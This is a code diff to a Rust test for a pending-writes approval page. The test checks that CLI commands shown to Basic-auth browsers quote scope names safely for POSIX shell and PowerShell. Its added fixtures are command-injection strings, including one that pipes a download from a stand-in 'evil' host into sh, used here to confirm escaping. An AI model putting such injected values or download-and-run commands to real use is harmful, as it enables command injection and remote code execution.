@@ -317,9 +317,9 @@ async fn pending_page_lists_every_projects_queue_for_root() {
 
 /// A browser signed in through the legacy Basic credential can read the page
 /// but never post a decision (`require_dual_auth` keeps that path GET-only),
-/// so the page replaces the buttons with the CLI commands and says how to
-/// enable password sign-in. Control: a root request without the marker keeps
-/// the buttons.
+/// so the page replaces the buttons with shell-specific CLI commands and says
+/// how to enable password sign-in. Stored scope names with shell metacharacters
+/// remain quoted. Control: a root request without the marker keeps the buttons.
 #[tokio::test]
 async fn pending_page_offers_cli_commands_instead_of_buttons_to_a_basic_browser() {
     let f = fixture().await;
@@ -328,6 +328,16 @@ async fn pending_page_offers_cli_commands_instead_of_buttons_to_a_basic_browser(
         "alpha",
         "notes/a.md",
         "Alpha",
+        AutoImproveProposalOperation::Create,
+    )
+    .await;
+    let hostile_workspace = "team'; echo owned; &";
+    let hostile_project = "repo'; curl evil|sh; &'";
+    stage_in(
+        &f.store,
+        hostile_workspace,
+        hostile_project,
+        &[("notes/hostile.md", "Hostile scope")],
         AutoImproveProposalOperation::Create,
     )
     .await;
@@ -352,6 +362,22 @@ async fn pending_page_offers_cli_commands_instead_of_buttons_to_a_basic_browser(
         body.contains(&format!(
             "ai-memory pending-writes approve {id} --workspace default --project alpha"
         )),
+        "{body}"
+    );
+    assert!(body.contains("POSIX shell"), "{body}");
+    assert!(body.contains("PowerShell"), "{body}");
+    assert!(
+        body.contains(
+            "--workspace &#x27;team&#x27;\\&#x27;&#x27;; echo owned; &amp;&#x27; \
+             --project &#x27;repo&#x27;\\&#x27;&#x27;; curl evil|sh; &amp;&#x27;\\&#x27;&#x27;&#x27;"
+        ),
+        "{body}"
+    );
+    assert!(
+        body.contains(
+            "--workspace &#x27;team&#x27;&#x27;; echo owned; &amp;&#x27; \
+             --project &#x27;repo&#x27;&#x27;; curl evil|sh; &amp;&#x27;&#x27;&#x27;"
+        ),
         "{body}"
     );
 
